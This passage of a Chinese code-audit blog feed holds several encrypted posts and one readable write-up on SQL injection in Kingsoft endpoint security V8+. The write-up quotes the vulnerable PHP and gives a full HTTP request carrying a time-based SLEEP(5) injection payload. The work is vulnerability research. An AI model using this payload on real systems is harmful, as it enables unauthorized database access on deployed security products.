        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="a1e895bd454b89f64aed0dcf2442a55024377f3d58f92ac405564458f5d9fa90">a9eae5fe6805503ebb5e368666781b2278f70b450ee78ad853a0085e440e2923cc028f85d66bd6ea3cb9dbb4b97dd2df17f2e756fad0148cfc120ad8833bd8926996504b960e0a8eb61962df53f3a381529b27779845129bb9ea31a1d1e72f3af95f7bd93113ca1c92fe245ad16e065473f86d941da3f947e7e5aaa84cbd03c0e80097a0cc9522fd40dc963e0d37f0bf6eb0a4368751cd1cebfb1911d959a6770fcafd6bb000d4d725a0502aada192c98a78bdf893fcf018297b2ad439a1ab68616993d9e468be8f86215998c3d8bd442d444359c0a589094355853005d2d915716d6a2290bd6a1f47f81c1e6e0333ed6eaacaf23312181b77e2c62593d231d3890fad459706267952a594184569feb6ce127340b9ba7c4515657e92d6781836c9235fd72a1261cd80e390b8ebc14320a072cc2f21406f4fe6f508edc6852f854ba47a7da3b13319400533a6eda9d73dc39e7f4df890eaaf527126e08c9215931c7a66badde3537eccd273107ad5c2fc55c56d661ca37dd4d938fd4da19ccfc1b7e754016b8ec2cf822b9dc0ab28ce2a28579bc170f562b74144f62824abd26b9a64982a553e52bdd76e2ad7f2ec58c4c556aaf1f3fae671282b6bb62cde904c349b3c2b9d98bd98637854ce121d4ac34155bf7b44de9ec699fd095dc62203f073701b3c13902df0c2f722c5a37e68d5b0baabf382445b7ed82dc515202b6cf1d6111bb9277e0db79bbf7fdbca723d7236ebc2b77382db5e1fd843d252331f91ba2b248e4a866d92b774075a6f11b5cc7e042198be8d8f5252f4b391cf45b50ce4d36844d98ad594f1b011f852668677c664c0ef2644fa64f14a8c4f420d4519ad5323d3c2ff2b5c96b15e1d3939bb103d8eafd37ad7b22192b7419a5e63c03cfac55cb691851a418bb9d736eead024ab3c085e4d1c25cb591ee55db0749a783381f4e8807387163402da71d9f6962c68aaad69b8f700182db881d90c8a610a82b95cff73669cf80bbab395f8b14f776e8c6967625344f2e4ee6dcda9972caca8642bf390103eb2339ece236174b8ddf0853a003837f89ec95e466de98595744ab3322f0b9da810dc3a6fda875d6f5deeb9f3b32ce066557f20783b1eb7f6a791cdf7cc71980361ec2d19d42ad02a7be9a3a49678eaf9a6975528d7784832549e5f0628ab319f57e7be43460d905d65df6f18e8fb31a9c6d9f24c13a80f1de503488d876ca0bf90edfde1708f7ae56f41bda6d1ab0887ac9b7f11f0ffffd5d8e6da8f2d72536f61822089c797760b463cb755e2ef1cbc169124dfc26fd729abd833c0a98d080f25932919a15e49609789fafad61b004d60c1a7adcbf056dc39cfb5e305b9bb8841e4262c46ba0af0d90dd54ef751b913c99879c8d4896d5e208ebaeba95da477063a727280cdea58ae536d54cce7ef4e774d8572d8f317855f2b307aa836c861a1c5d44a2440bcef21abae456da89c65694ed5de313f2ee689d3be12a990a03568d96d59429620875160c6234fafb1f512d1698ee3dbe79719be6cdc4164a900f4b860525f44cba12cf6d741e1c8b9f800c6330b0133cfed4542a90dee8a19dc153026e060fd36f02427e6e8f584f0cbf618691b3fff41d554d4356a1f1cddf6d87b0c2addcadf1fdb0163a7eebe2801ba1b547f4d29b38ab1ea7600804a4d112bbc6f8672f2c8045218d652c53f06ceb7285c1a843c0f217d287f5f30878b55d45d43481d6f1a4b69b87a4926c60b060b17fba8275103dd8c000fe662f5d3aa8e41a0abbd0e0b4ea04e5f8e738189704f6890b7ebe25972c257b13999b71a34302b6cc6c2da1d18b5e817bf6eee764a96e6100c909df3ef7e7db3c2be2948b9805d98926fa0323a56ec3066ae3568c6f279d950c3b370924072250dba375e9a67142d8c4d63cfe5e249e274943f005f0dd39b02037c33489088973380c58fc2f9f4d3f9a1576c5a309be14327c715e6c82582e36090392def8e26a09b84043bc8bb4259b1dfc29606b042f15bb504a630c05e54a6e85c0fbd0d97726cdc9c7f89ca5457c9aa760d5e8fddba60a6ac9b4ec7ce6ada288b17e5aea9164abbd4a2ac546c2592581c669ffd0a16faf176597a6cb557aed7caa08abe137333438aa0d2728833f182d9ad3f69dacae6ec9f04b44f5b2ed623a5187a5e52717e23f5520b5aad1ca2cccb09fbde2f63d2540b3d90f0e2a29f057605113904d0a2ee2396ddf6e5c9cf1cafed442b57681016277ea4085f4074fc8bc0e1565e34981e22c23af18eceb0ce552e784fe425da9321b4033e18bdf3bb4734c960ec54b49ef26e9aab083d9e951d0997b839903f1c642a06d8e37115ca3c100bd9010c39ecbadd3b35c17c4c5c0dd576c5ada1b0ece9e4e7f32240ba7d6baeae10b90d64807494dd7e443a3ecc61469081c11ad15d54168d4051cc09b77a437941245341c4826dad4e421ebfd8cbd30537d0883cc078c0ab544b0bda1ce486406b96ce69cac00565b346df2715c1c8f4de29229acf1517b9c12f95ab45a258e341129521d23cbbbe02e253fe19db1474589d80c8bc8a5496de463080b0c74ea762d1ba59e0bf9cda75e142117d9b3281debf1244a49c3beb69d1b5396f954ff327ee2e3be0468d91ff31c75f08492c113a69a58ab08b3ea96e3fa5aa450790e3025f68204978c91b263931f47657e63de8dc390d51cd5e1714603dd82dd15a452e314c0df4b5d6291552e0def3c512635516f7d6ddadb10a9c859d23538ff719ad28f66be487a1b9670d0c903f441bd567e6fb47a6ae4b114097ecaa421954723357ca7f5801da1e21275f345d845522bd63462a0e3052b6ecb8f618e68b8dc6b18dd87c386a0449d97bd606c11bce92351ae28a9b15432dc75bd63a66b5d84a3b378ecd9fe35a043f7e38374bb34ee5530794c4fb499b50bbdb0af304f5d7b52a0eaf7c72b66dfa3612a33b13713a088ebed7ae6f4a4605bca612c93e92c51f62761339aded2dd8f6c80224e9f5e9be8db5526cb54f17ca2741ac1cd57d2f11525aa9bd8c9b502ee9affb92dbd992fc5820f5c577773ce6268617f778ac674ac54a1d79095916903813e687d8b6564b82e06b9976df29e55467cf8eb18d217e03eeebe78081bc9817ce1b75de4a4364697ec08696bdb5bab01aeb8ab102f5eb8cf5fe4e8031ecf9501f10bc59dc301f8395a4c1112ccf37960fdc2a3db393eeb3a4563637ae5918ccb950fb41145c16ad2d73427d1fce82acd8b1fe9963145bbd5ade287a0e908394bee69b1176145f3a699e8cbdb938a9bf76f10c70bd293d171d0ff46c500555cea93bab4b6cb183129580ca071cf6b2bbacf44fc546587b46f725bff386b688d4a6cd9dce4610b87872707e387dc177a6b18e50ea72082323309da3854e6afbfe37251e044d6146bf8475e8673b54745c5ca55c67f6005a0a8029dc883fc4b8c8709f2a88ad30480ab2e38bb506f855e5321505d1368b94ff4aafce678188dd10ce033e287d22d2afc2377802f82ce46f604dcc899fa14b249810a023a0ee2c6bef1535ff657468e70346d17a68a8a0c985e934d3331eaf0ab4bee1f1b325c07ce24cedc62b3f23748669be47fa3c39344ef8e2c87254e336b03494984d44fd405b75124bb26eee4a2fa0855718ad7e65c2823e11b2fd65c2ceca25b1d76f4541cb1dfb7d6b7635a10423ef88796f36edee3b2b7b22fec0d61d002e133c94bdd881055fb0e899807e921ef23d5ba4dbb04d03357d93db0e7a7ca23ec43127230b7f48f26e4892dcaf9b9dc6dca8d3eca9157e68fd92696c090641c57fe728cabf321d372a73e83b7ba64faa22d09ff4cc4982dacec021bd18c149486af3d0c52bd2da15899131b0ab69959a49f66dd2a6160b72746f8a3237c072f166fc0071ab3433b74ca6c2b0fda7e19983ef33e536166efc4ade8ba211e53d5c5c60a49cc82eff936602f747a10d7c8d7a45343fdde07ec9929622b0529e9f66eb4a40ca84cfe7809684bbef7d95df7ed6923217e5284735245de3be255a9fc4469751581ab15793c24a13035c3532a780c6443857594e95ae972e9964873176412d9325f1752ca11931b95be17e2ae9fe2087a6f4fddc5d2eaf23aeab145f19b186a1539ce430c13f698e78790bcf1bd2e130b4a18d7a4f329bf0d18db79aa4d93113a1e81a02816e0bc42b7a77e1eadc5b27e25068439956d6fdf5af4a2ee41ae0fbce95994691e319911aa4a51aa38cee7f17856452c77391ce5df1b650de01740012b9cae82c2836adb59490fd1fb46a65ac2bd0f3df5945d8f164d44ba0be29dcb3c8cc69752eaf984371355f83d8cdf47de979cfd802b99cab8cffd9797c5cf61f8f57bd6e7b7c26b62b3f511ddfb779615b44973f0eccb57d8946ec562db2e5f3e0c7c73c92faaec2c91fc8ececb4d3b7c8842c5ddb4dad7e4ae1b5d1b254724bb650e329cdeb73bed0783622b0c3168f9832b624b194d7eb25cc7a51132b239e4f4512cdf71a33f261bf21fa8cd3a85c3f063670bcbaed3f92fa70a8d7dae7f40f745fb74a1d345a6830b7aefaf3436db66cb5411cf660f0e9c88d25a71c29f27018a9a2131c7cdb4b1c63f2b46024057bd289bc4d1860d7a9c02651e4b2df12822570b12151bbb9a2277824866eecdeefeca538f3df6112e0b8c9959f9054606ba4acbb00e5f72f15940c697e9180cf80d70619c383d7a7e527f89e2853b79e5282d4626710cabcea3e50d959e31543effcab87515450028617f1027d881fab782eb0256c3cc2ee405e86fc6adbf2c73828824e1a352d06f8818d98ed767eb3e6b0abfc22ff85d901905a07a56497761ee52cf54254fe2331276471264d256aa44e723ed0e6e14ab4f4b8d795209048f97c5ba41a332bc8cc8df073b0dfef2e4bb7f0222be46c8e8f8ffd3294aa9646fecde4e1547ef6b47b6edebbed2e7e5be46ab130fcba31963b4ab180acc5089cf418c3dbf99252c07b99e8e8c3ba858ae736a3455acca194b33c38cc9f70cda502584fe3fa06fd0d1193de3d3178f3c96fa1fc05f2e8efb01b250b327d9602f84b2dbd2301dd8fa8fe9d0a88fc66a8c812419dadaf553d22a3dcdaf8e77951f418827d290680803963c2755decc78e7135e57421d9dc7659e2b34f6de30f6c790b97da0daa81eb0d1ae2e060b380a7112e9617a84af2892082e62edcab52d94033b849cbaec009a46b21b52e8b5a40a531f497dc79ace3352129acae668ac1d9aead9b3e0b5942981d05def95c6bc949583b61f37256002b82e4316012ebf1ee73026bb1dfcbea651977396e9aad262989fd779e1ee95ddbb73c244550659040324bfeaace5e8ad6c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金山终端安全系统V9安全问题</title>
      <link href="/p/6fcd.html"/>
      <url>/p/6fcd.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="ffca9dbd4c080f916a37d16f92a67f76ba9167586e6b8b473c4bea2309bf1d05"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金山V8+多个漏洞</title>
      <link href="/p/2d16.html"/>
      <url>/p/2d16.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><code>inter/handler_get_set_data/set_sc_count_online_setup_data_cmd.php</code></p><p>函数<code>set_sc_count_online_setup_data_cmd</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_sc_count_online_setup_data_cmd</span>(<span class="params"><span class="variable">$para</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$logHandler</span>, <span class="variable">$mysqlDB</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  $logHandler-&gt;LogError(&#x27;set_sc_count_online_setup_data_cmd&#x27;);</span></span><br><span class="line">   </span><br><span class="line">   <span class="variable">$keyData</span> = <span class="keyword">array</span>(<span class="string">&quot;client&quot;</span>,<span class="string">&quot;server&quot;</span>,<span class="string">&quot;scid&quot;</span>);</span><br><span class="line">    <span class="variable">$check</span> = <span class="title function_ invoke__">checkParam</span>(<span class="variable">$keyData</span>,<span class="variable">$para</span>,<span class="variable">$logHandler</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span> !== <span class="literal">true</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$SCID</span>=  <span class="variable">$para</span>[<span class="string">&#x27;scid&#x27;</span>];</span><br><span class="line">    <span class="variable">$data_type</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$para</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&#x27;client&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$data_type</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&#x27;server&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$data_type</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$sqlstr</span>=<span class="string">&#x27; replace into  systemcenter_count(scid,data_type,count_online,count_install,count_unhealth) values(&#x27;</span>;</span><br><span class="line">   <span class="variable">$sqlstr</span> .= <span class="variable">$SCID</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$data_type</span>.<span class="string">&#x27;,&#x27;</span>. <span class="variable">$value</span>[<span class="string">&#x27;count_online&#x27;</span>] .<span class="string">&#x27;,&#x27;</span>. <span class="variable">$value</span>[<span class="string">&#x27;count_install&#x27;</span>].<span class="string">&#x27;,&#x27;</span>.  <span class="variable">$value</span>[<span class="string">&#x27;count_unhealth&#x27;</span>].<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="comment">//$logHandler-&gt;LogError(&#x27;set_sc_count_online_setup_data_cmd&#x27;.$sqlstr);</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$mysqlDB</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sqlstr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$logHandler</span>-&gt;<span class="title function_ invoke__">LogError</span>(<span class="string">&quot;Faild to replace into systemcenter_clientdata  database:&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用点<code>inter/ajax_upload_parent_sc.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$postStr</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$postStr</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$post</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$postStr</span>,JSON_UNESCAPED_UNICODE);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$post</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;param cann&#x27;t be json_decode!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;param cann&#x27;t be empty!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$post</span> <span class="keyword">as</span> <span class="variable">$cmd</span> =&gt; <span class="variable">$inputData</span>) </span><br><span class="line">&#123;      </span><br><span class="line"><span class="comment">//$logHandler-&gt;LogError(  &#x27;ajax_upload_parent_sc:&#x27;.  $cmd.&#x27; inputdata:&#x27;.json_encode($inputData)  );</span></span><br><span class="line">          <span class="keyword">if</span>(   <span class="title function_ invoke__">upload_data_to_parent_sc</span>(<span class="variable">$cmd</span>,<span class="variable">$inputData</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">          <span class="variable">$re</span> = <span class="keyword">array</span>(<span class="string">&quot;nResult&quot;</span> =&gt; <span class="number">0</span>) ;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$re</span> =<span class="keyword">array</span>(<span class="string">&quot;nResult&quot;</span> =&gt; <span class="number">1</span>) ;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="variable">$re</span> = <span class="keyword">array</span>(<span class="string">&quot;nResult&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;mess&quot;</span> =&gt; <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">upload_data_to_parent_sc</span>(<span class="params"><span class="variable">$cmd_name</span>,<span class="variable">$para</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$logHandler</span>, <span class="variable">$mysqlDB</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bFromLocalData</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name_get_file</span> = <span class="string">&quot;handler_get_set_data/get_&quot;</span>.<span class="variable">$cmd_name</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="variable">$name_set_file</span> = <span class="string">&quot;handler_get_set_data/set_&quot;</span>.<span class="variable">$cmd_name</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="variable">$name_get_func</span> = <span class="string">&quot;get_&quot;</span>.<span class="variable">$cmd_name</span>;</span><br><span class="line"><span class="variable">$name_set_func</span> = <span class="string">&quot;set_&quot;</span>.<span class="variable">$cmd_name</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//   $logHandler-&gt;LogError($name_get_file);</span></span><br><span class="line"> <span class="comment">//   $logHandler-&gt;LogError($name_set_file);</span></span><br><span class="line"> <span class="comment">//   $logHandler-&gt;LogError($name_get_func);</span></span><br><span class="line"> <span class="comment">//   $logHandler-&gt;LogError($name_set_func);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//  $logHandler-&gt;LogError(json_encode($para));</span></span><br><span class="line">  <span class="comment">//  $logHandler-&gt;LogError($para);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$name_get_file</span>) <span class="keyword">and</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$name_set_file</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$name_get_file</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$name_set_file</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$para</span>==nil <span class="keyword">or</span> <span class="variable">$para</span>==<span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="title function_ invoke__">count</span>( <span class="variable">$para</span>)&lt;=<span class="number">0</span> )    <span class="comment">//数据不存在取本地数据</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$all_data</span>=<span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">if</span> ( <span class="title function_ invoke__">function_exists</span>(<span class="variable">$name_get_func</span>) == <span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$all_data</span> = <span class="variable">$name_get_func</span>();</span><br><span class="line"> &#125;</span><br><span class="line">      <span class="variable">$bFromLocalData</span>= <span class="literal">true</span>;</span><br><span class="line">      <span class="variable">$logHandler</span>-&gt;<span class="title function_ invoke__">LogError</span>(<span class="string">&quot;update_send_client_to_rootsc_cmd  0 &quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$all_data</span>));</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$all_data</span>==<span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>   <span class="comment">//拿上传的数据</span></span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$all_data</span> = <span class="variable">$para</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="variable">$bFromLocalData</span> )  <span class="comment">//保存数据库</span></span><br><span class="line">&#123;   </span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> ( <span class="title function_ invoke__">function_exists</span>(<span class="variable">$name_set_func</span>) == <span class="literal">true</span>) &#123;</span><br><span class="line"> <span class="keyword">if</span>(! <span class="variable">$name_set_func</span>(<span class="variable">$para</span>) )</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (  <span class="title function_ invoke__">GetIsRoot</span>()!=<span class="number">1</span>) &#123; <span class="comment">//上传的数据</span></span><br><span class="line"><span class="variable">$ParentSC_ip</span>=<span class="title function_ invoke__">GeParentSCIP</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ParentSC_ip</span>==<span class="string">&quot;&quot;</span>) &#123; </span><br><span class="line"><span class="variable">$logHandler</span>-&gt;<span class="title function_ invoke__">LogError</span>(<span class="string">&quot;Faild to get parent sc ip&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line">         <span class="variable">$ParentSC_port</span> =<span class="title function_ invoke__">CheckParentSCOpenPort</span>(<span class="variable">$ParentSC_ip</span>);</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$ParentSC_port</span>==<span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$logHandler</span>-&gt;<span class="title function_ invoke__">LogError</span>(<span class="string">&quot;Faild to Check parent sc port  or  parent sc is stop &quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$re</span> =  <span class="title function_ invoke__">uploadDataToParentSC</span>(<span class="variable">$cmd_name</span>,<span class="variable">$ParentSC_ip</span>,<span class="variable">$ParentSC_port</span>, <span class="variable">$all_data</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$re</span> === <span class="literal">false</span> )  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /inter/import_group_list.php HTTP/1.1</span><br><span class="line">Host: 192.168.86.128</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fho7sdaismnp732n8ttlspvmm5; fromLogin=1; GUID=1FF2C85D-D77A-4BE6-9D7D-80BD14051738; SCIP=192.168.86.128; topSC=0; SCNum=1; kidtype=1; hid=ECAF985A; sn=105000-011000-000000-000000</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 441</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;sc_count_online_setup_data_cmd&quot;: &#123;</span><br><span class="line">        &quot;server&quot;: &#123;</span><br><span class="line">            &quot;count_online&quot;: 1,</span><br><span class="line">            &quot;count_install&quot;: 1,</span><br><span class="line">            &quot;count_unhealth&quot;: 1</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;client&quot;: &#123;</span><br><span class="line">            &quot;count_online&quot;: 1,</span><br><span class="line">            &quot;count_install&quot;: 1,</span><br><span class="line">            &quot;count_unhealth&quot;: 1</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;scid&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;offline_SCID&quot;: &#123;</span><br><span class="line">            &quot;1&quot;: &quot;1,2,3,4)/**/&amp;&amp;/**/SLEEP(5)/**/&amp;&amp;/**/(7408=7408&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210510100956545.png" alt="image-20210510100956545"></p><p><img src="/images/image-20210513112201930.png" alt="image-20210513112201930"></p><h1 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h1><p><code>mobile/app_virus_info.php</code></p><p><img src="/images/image-20210513124125106.png" alt="image-20210513124125106"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浪潮ClusterEngine登录控制缺陷</title>
      <link href="/p/a698.html"/>
      <url>/p/a698.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" 